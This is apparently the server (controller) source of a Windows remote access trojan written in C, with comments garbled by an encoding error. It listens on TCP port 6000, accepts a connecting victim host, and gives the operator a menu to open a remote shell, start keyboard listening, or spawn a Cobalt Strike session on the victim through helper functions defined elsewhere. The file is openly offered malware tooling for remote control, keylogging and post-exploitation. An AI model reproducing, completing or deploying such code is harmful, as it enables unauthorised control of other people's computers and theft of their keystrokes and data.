#define _CRT_SECURE_NO_WARNINGS 1
#include <WinSock2.h>
#include <windows.h>
#pragma comment(lib,"ws2_32.lib")
#include <stdio.h>
#include <Ws2tcpip.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <cstdio> 
#include "baseFunction.h"
#include "choice.h"
#define MSG_LEN 10244

int main() {
	int err;
	char sendChar[MSG_LEN];
	char recvChar[MSG_LEN];
	SOCKET sockServer;
	SOCKET sockClient;
	SOCKADDR_IN addrServer;
	SOCKADDR_IN addrClient;
	char clientIp[20];
	char *customChar;

	WSADATA wsaData;
	WORD wVersionRequested;

	//���� Windows Sokcet�汾
	wVersionRequested = MAKEWORD(2, 2);

	//��ʼ�� Windows Sockert
	err = WSAStartup(wVersionRequested, &wsaData);

	if (err != 0) {
		printf(TEXT("Windows Socket��ʼ��ʧ��"));
		return 0;
	}

	/*ȷ��WinSock DLL֧��2.2*/
	sockServer = socket(AF_INET, SOCK_STREAM, 0);
	sockClient = socket(AF_INET, SOCK_STREAM, 0);
	addrServer.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrServer.sin_family = AF_INET;
	addrServer.sin_port = htons(6000);

	//�������socket�͵�ַ�˿ڰ�
	bind(sockServer, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));

	//listen�����˿�
	listen(sockServer, 5);
	printf("��������������������......\n");

	int len = sizeof(SOCKADDR);

	//accept����������ֱ���пͻ�������

	sockClient = accept(sockServer, (SOCKADDR *)&addrClient, &len);
	inet_ntop(AF_INET, &addrClient.sin_addr, clientIp, 20);
	//sprintf_s(sendChar, "��ӭip:%s �û����ӷ����!", clientIp);
	printf("��ӭip:%s �û����ӷ����!\n", clientIp);
	//send(sockClient, sendChar, strlen(sendChar) + 1, 0);
	customChar = (char *)malloc(MSG_LEN);
	while (1) {
		printf("1������shell����shellģʽ\n2������keyboardListen�������̼���\n3������SpawnCS��shell����֮Cobalt Strike:\n");
	fgets(customChar, MSG_LEN, stdin);
	trim(customChar);
	
		if (strcmp(customChar, "shell") == 0) {
			//printf("shell����\n");
			dealShell(sockClient);
		}
		else if (strcmp(customChar, "SpawnCS") == 0) {
			printf("SpawnCS����");
			dealSpawn(sockClient);
		}
		else if (strcmp(customChar, "keyboardListen") == 0) {
			printf("keyboardListen����");
		}
		else {
			printf("��������ȷ��ѡ��");
		}
	}
	/*
	while (1)
	{
		ZeroMemory(customChar, MSG_LEN);
		
		printf("����������:");
		fgets(customChar, MSG_LEN, stdin);

		
		send(sockClient, customChar, MSG_LEN, 0);
		recv(sockClient, recvChar, MSG_LEN, 0);
		puts(recvChar);
		ZeroMemory(recvChar, MSG_LEN);
	}
	closesocket(sockClient);
	*/

	system("pause");
	closesocket(sockClient);
	return 0;
}